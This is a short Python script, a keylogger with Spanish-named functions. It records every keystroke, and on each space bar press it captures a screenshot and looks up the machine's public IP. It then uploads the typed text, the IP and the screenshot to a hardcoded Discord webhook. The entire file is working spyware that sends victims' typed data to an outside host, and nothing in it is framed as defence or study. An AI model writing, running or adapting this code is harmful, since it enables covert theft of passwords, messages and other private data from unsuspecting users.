import keyboard
import requests
import pyautogui

palabra = ""
webhook_url = "https://discord.com/api/webhooks/1233891499595399240/UrQp0ABxRLSlahPKWixhhKGTqk-WORKaKEFKZxczgpRBZd1gb-LsZMk4hF0JKgvKNhib"

def get_raw_text(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.text
    else:
        print("Failed to fetch the webpage.")
        return None


def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

def pulsacion_tecla(pulsacion):
    global palabra

    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == 'space':
            take_screenshot()
            send_to_discord()
        elif len(pulsacion.name) == 1:
            palabra += pulsacion.name

def send_to_discord():
    global palabra
    raw_text = get_raw_text("https://ident.me")
    files = {'file': open("screenshot.png", "rb")}
    payload = {"content": palabra + "  · " + str(raw_text)}
    try:
        response = requests.post(webhook_url, files=files, data=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print("Error:", e)
    palabra = ""

keyboard.hook(pulsacion_tecla)

try:
    keyboard.wait("")
except KeyboardInterrupt:
    print("Stopping...")
